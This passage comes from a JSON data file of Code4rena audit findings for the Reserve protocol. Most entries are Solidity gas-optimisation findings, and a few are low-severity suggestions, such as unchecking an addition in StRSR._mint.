      "content": "```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24622",
      "title": "[G-32] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There are 18 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24621",
      "title": "[G-31] `<array>.length` should not be looked up in every loop of a `for`-loop",
      "impact": "GAS",
      "content": "The overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset.\n\n*There are 12 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24620",
      "title": "[G-30] `public` functions not called by the contract should be declared `external` instead",
      "impact": "GAS",
      "content": "Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public` and [prior to solidity version 0.6.9](https://ethereum.stackexchange.com/a/107939) can save gas by doing so.\n\n*There are 2 instances of this issue.*\n\n## Excluded findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;31] | `<array>.length` should not be looked up in every loop of a `for`-loop | 12 |  36 |\n| [G&#x2011;32] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 18 |  - |\n| [G&#x2011;33] | Using `bool`s for storage incurs overhead | 4 |  68400 |\n| [G&#x2011;34] | Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement | 11 |  66 |\n| [G&#x2011;35] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 11 |  55 |\n| [G&#x2011;36] | Using `private` rather than `public` for constants, saves gas | 33 |  - |\n| [G&#x2011;37] | Division by two should use bit shifting | 8 |  160 |\n| [G&#x2011;38] | Use custom errors rather than `revert()`/`require()` strings to save gas | 151 |  - |\n| [G&#x2011;39] | Functions guaranteed to revert when called by normal users can be marked `payable` | 12 |  252 |\n\nTotal: 260 instances over 9 issues with **68969 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24619",
      "title": "[G-29] Don't use `_msgSender()` if not supporting EIP-2771",
      "impact": "GAS",
      "content": "Use `msg.sender` if the code does not implement [EIP-2771 trusted forwarder](https://eips.ethereum.org/EIPS/eip-2771) support.\n\n*There are 35 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24618",
      "title": "[G-28] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24617",
      "title": "[G-27] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "Custom errors are available from solidity version 0.8.4. Custom errors save [**~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hit by [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas.\n\n*There are 25 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24616",
      "title": "[G-26] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`). Empty `receive()`/`fallback() payable` functions that are not used, can be removed to save deployment gas.\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24615",
      "title": "[G-25] `require()` or `revert()` statements that check input arguments should be at the top of the function",
      "impact": "GAS",
      "content": "Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting a Gcoldsload (**2100 gas***) in a function that may ultimately revert in the unhappy case.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24614",
      "title": "[G-24] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "If needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There are 11 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24613",
      "title": "[G-23] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "> When using elements that are smaller than 32 bytes, your contractâ€™s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\nhttps://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html\nEach operation involving a `uint8` costs an extra [**22-28 gas**](https://gist.github.com/IllIllI000/9388d20c70f9a4632eb3ca7836f54977) (depending on whether the other operand is also a variable of type `uint8`) as compared to ones involving `uint256`, due to the compiler having to clear the higher bits of the memory word before operating on the `uint8`, as well as the associated stack operations of doing so. Use a larger size then downcast where needed.\n\n*There are 68 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24612",
      "title": "[G-22] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "See [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper by **3 gas**.\n\n*There are 15 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24611",
      "title": "[G-21] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)",
      "impact": "GAS",
      "content": "Saves **5 gas per loop**.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/p1/mixins/Trading.sol\n\n72:           tradesOpen--;\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/mixins/Trading.sol#L72\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24610",
      "title": "[G-20] `>=` costs less gas than `>`",
      "impact": "GAS",
      "content": "The compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde).\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24609",
      "title": "[G-19] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "- Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining\n- Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\n- Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\n- Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/plugins/aave/ReentrancyGuard.sol\n\n3:    pragma solidity >=0.6.0 <0.8.0;\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/aave/ReentrancyGuard.sol#L3\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24608",
      "title": "[G-18] Use a more recent version of solidity",
      "impact": "GAS",
      "content": "- Use a solidity version of at least 0.8.0 to get overflow protection without `SafeMath`\n- Use a solidity version of at least 0.8.2 to get simple compiler automatic inlining\n- Use a solidity version of at least 0.8.3 to get better struct packing and cheaper multiple storage reads\n- Use a solidity version of at least 0.8.4 to get custom errors, which are cheaper at deployment than `revert()/require()` strings\n- Use a solidity version of at least 0.8.10 to have external calls skip contract existence checks if the external call has a return value\n\n*There are 7 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24607",
      "title": "[G-17] Optimize names to save gas",
      "impact": "GAS",
      "content": "`public`/`external` function names and `public` member variable names can be optimized to save gas. See [this](https://gist.github.com/IllIllI000/a5d8b486a8259f9f77891a919febd1a9) link for an example of how it works. Below are the interfaces/abstract contracts that can be optimized so that the most frequently-called functions use the least amount of gas possible during method lookup. Method IDs that have two leading zero bytes can save **128 gas** each during deployment, and renaming functions to have lower method IDs will save **22 gas** per call, [per sorted position shifted](https://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92).\n\n*There are 49 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24606",
      "title": "[G-16] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "Each extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24605",
      "title": "[G-15] `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops",
      "impact": "GAS",
      "content": "The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**.\n\n*There are 51 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24604",
      "title": "[G-14] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 6 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24603",
      "title": "[G-13] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "Not inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24602",
      "title": "[G-12] `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables",
      "impact": "GAS",
      "content": "Using the addition operator instead of plus-equals saves **[113 gas](https://gist.github.com/IllIllI000/cbbfb267425b898e5be734d4008d4fe8)**.\n\n*There are 10 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24601",
      "title": "[G-11] The result of function calls should be cached rather than re-calling the function",
      "impact": "GAS",
      "content": "The instances below point to the second+ call of the function within a single function.\n\n*There are 12 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24600",
      "title": "[G-10] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/p1/RToken.sol\n\n/// @audit issueQueues[account] on line 635\n635:          return (issueQueues[account].left, issueQueues[account].right);\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/RToken.sol#L635\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24599",
      "title": "[G-09] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "The instances below point to the second+ access of a state variable within a function. Caching of a state variable replaces each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 60 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24598",
      "title": "[G-08] Avoid contract existence checks by using low level calls",
      "impact": "GAS",
      "content": "Prior to 0.8.10 the compiler inserted extra code, including `EXTCODESIZE` (**100 gas**), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence.\n\n*There are 67 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24597",
      "title": "[G-07] Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declearing the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/p1/Distributor.sol\n\n134:              Transfer memory t = transfers[i];\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/Distributor.sol#L134\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24596",
      "title": "[G-06] Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas",
      "impact": "GAS",
      "content": "When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead. \n\nIf the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one.\n\nNote that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved.\n\n*There are 8 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24595",
      "title": "[G-05] Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/interfaces/IGnosis.sol\n\n/// @audit Variable ordering with 11 slots instead of the current 12:\n///           uint256(32):orderCancellationEndDate, uint256(32):auctionEndDate, bytes32(32):initialAuctionOrder, uint256(32):minimumBiddingAmountPerOrder, uint256(32):interimSumBidAmount, bytes32(32):interimOrder, bytes32(32):clearingPriceOrder, uint256(32):feeNumerator, uint256(32):minFundingThreshold, user-defined(20):auctioningToken, uint96(12):volumeClearingPriceOrder, user-defined(20):biddingToken, bool(1):minFundingThresholdNotReached, bool(1):isAtomicClosureAllowed\n6     struct GnosisAuctionData {\n7         IERC20 auctioningToken;\n8         IERC20 biddingToken;\n9         uint256 orderCancellationEndDate;\n10        uint256 auctionEndDate;\n11        bytes32 initialAuctionOrder;\n12        uint256 minimumBiddingAmountPerOrder;\n13        uint256 interimSumBidAmount;\n14        bytes32 interimOrder;\n15        bytes32 clearingPriceOrder;\n16        uint96 volumeClearingPriceOrder;\n17        bool minFundingThresholdNotReached;\n18        bool isAtomicClosureAllowed;\n19        uint256 feeNumerator;\n20        uint256 minFundingThreshold;\n21:   }\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/interfaces/IGnosis.sol#L6-L21\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24594",
      "title": "[G-04] State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/p1/StRSR.sol\n\n/// @audit Variable ordering with 21 slots instead of the current 22:\n///           string(32):name, string(32):symbol, uint256(32):era, mapping(32):stakes, uint256(32):totalStakes, uint256(32):stakeRSR, mapping(32):_allowances, uint256(32):draftEra, mapping(32):draftQueues, mapping(32):firstRemainingDraft, uint256(32):totalDrafts, uint256(32):draftRSR, mapping(32):_nonces, uint256(32):rsrRewardsAtLastPayout, uint192(24):stakeRate, uint48(6):unstakingDelay, uint192(24):draftRate, uint48(6):rewardPeriod, uint192(24):rewardRatio, uint48(6):payoutLastPaid, address(20):assetRegistry, address(20):backingManager, address(20):basketHandler, user-defined(20):rsr\n42:       string public name; // mutable\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/p1/StRSR.sol#L42\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24593",
      "title": "[G-03] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**). \n\nWhile `string`s are not value types, and therefore cannot be `immutable`/`constant` if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract `abstract` with `virtual` functions for the `string` accessors, and having a child contract override the functions with the hard-coded implementation-specific values.\n\n*There are 6 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24592",
      "title": "[G-02] Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.\n\n*There are 4 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, please see the warden's [full report](https://github.com/code-423n4/2023-01-reserve-findings/issues/391).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24591",
      "title": "[G-01] Don't apply the same value to state variables",
      "impact": "GAS",
      "content": "If `_whenDefault` is already `NEVER`, it'll save 2100 gas to not set it to that value again\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: /contracts/plugins/assets/FiatCollateral.sol\n\n189:             if (sum >= NEVER) _whenDefault = NEVER;\n\n```\nhttps://github.com/reserve-protocol/protocol/blob/df7ecadc2bae74244ace5e8b39e94bc992903158/contracts/plugins/assets/FiatCollateral.sol#L189\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24590",
      "title": "[O-07] Value should be unchecked",
      "impact": "LOW",
      "content": "The function `_mint` is used to mint tokens to user's accounts.\n\nThe storage variable `totalStakes` is an uint256 and there is a check before that preventing it from going overflow.\n\ntotalStakes should be unchecked as there is no chance to overflow.\n\n```solidity\ncontracts/p1/StRSR.sol\n\n694:  function _mint(address account, uint256 amount) internal virtual {\n695:        require(account != address(0), \"ERC20: mint to the zero address\");\n696:        assert(totalStakes + amount < type(uint224).max);\n697:\n698:        stakes[era][account] += amount;\n699:        totalStakes += amount;\n700:\n701:        emit Transfer(address(0), account, amount);\n702:        _afterTokenTransfer(address(0), account, amount);\n703:    }\n```\n\nConsider unchecking totalStakes as how it is done in the `_burn` function as well:\n\n```solidity\n694:  function _mint(address account, uint256 amount) internal virtual {\n695:        require(account != address(0), \"ERC20: mint to the zero address\");\n696:        assert(totalStakes + amount < type(uint224).max);\n697:\n698:        stakes[era][account] += amount;\n699:        unchecked { totalStakes += amount; }\n700:\n701:        emit Transfer(address(0), account, amount);\n702:        _afterTokenTransfer(address(0), account, amount);\n703:    }\n```\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reserve",
      "source_link": "https://code4rena.com/reports/2023-01-reserve",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24589",
      "title": "[O-06] Commented out code",
      "impact": "LOW",
